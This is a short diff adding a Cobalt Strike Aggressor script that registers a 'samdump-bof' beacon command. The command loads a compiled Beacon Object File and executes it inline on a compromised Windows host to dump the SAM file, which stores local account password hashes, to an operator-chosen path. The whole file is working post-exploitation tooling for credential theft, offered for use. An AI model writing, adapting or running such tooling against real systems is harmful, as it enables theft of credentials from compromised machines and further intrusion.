@@ -1,0 +1,21 @@
+beacon_command_register("samdump-bof", "Dump Sam File.",
+	"Synopsis: samdump-bof <C:\\ProgramData>\n");
+
+alias samdump-bof {
+    local('$path $barch $handle $data $args');
+    $path = $2;
+    if ($path eq "") {
+		berror($1, "Please specify a valid path.");
+		return;
+	}
+
+	blog($1, "Let's start Dump Sam File, please wait...");
+    $barch  = barch($1);
+	$handle = openf(script_resource("samdump-bof. $+ $barch $+ .obj"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	# Pack our arguments
+	$args = bof_pack($1, "z", $path);
+	beacon_inline_execute($1, $data, "go", $args);
+}
